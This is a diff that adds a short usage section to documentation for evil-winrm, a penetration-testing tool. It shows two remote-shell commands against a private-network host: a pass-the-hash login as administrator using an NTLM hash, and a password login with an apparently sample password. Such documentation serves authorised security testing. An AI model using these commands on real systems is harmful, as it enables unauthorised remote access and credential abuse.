@@ -5,3 +5,16 @@
 * You can auth either with a hash or password
 * Supports SSL
 
+### Usage
+
+* Connect with pass the hash attack
+
+```
+evil-winrm -i 10.10.100.15 -u administrator -H "c2597747aa5e43022a3a3049a3c3b09d"
+```
+
+* Password Authentication:
+
+```
+evil-winrm -i 10.10.100.15 -u a-whitehat -p "bNdKVkjv3RR9ht"
+```
